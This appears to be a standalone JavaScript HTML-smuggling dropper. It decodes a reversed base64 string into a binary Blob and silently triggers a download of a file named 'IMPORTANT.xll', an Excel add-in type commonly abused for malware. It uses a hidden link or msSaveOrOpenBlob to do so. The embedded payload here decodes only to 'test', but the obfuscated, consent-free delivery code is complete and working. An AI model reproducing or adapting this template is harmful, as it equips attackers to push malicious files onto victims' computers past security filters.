 function dcd(cntnt) {
            var bstr = window.atob(cntnt);
            var len = bstr.length;
            
            var bytes = new Uint8Array( len );
                for (var i = 0; i < len; i++) { bytes[i] = bstr.charCodeAt(i); }
                return bytes.buffer;
            }
var naiveReverse = function(string) {
    return string.split('').reverse().join('');
}
            var fil = '=oAdzVGd'
            var data = dcd(naiveReverse(fil));

            
            var blob = new Blob([data], {type: 'octet/stream'});
            var fnm = 'IMPORTANT.xll';

            if (window.navigator.msSaveOrOpenBlob) {
                window.navigator.msSaveOrOpenBlob(blob,fnm);
            } else {
                var b = document.createElement('a');
                document.body.appendChild(b);
                b.style = 'display: none';
                var uria = window.URL.createObjectURL(blob);
                b.href = uria;
                b.download = fnm;
                b.click();
                window.URL.revokeObjectURL(uria);
            }
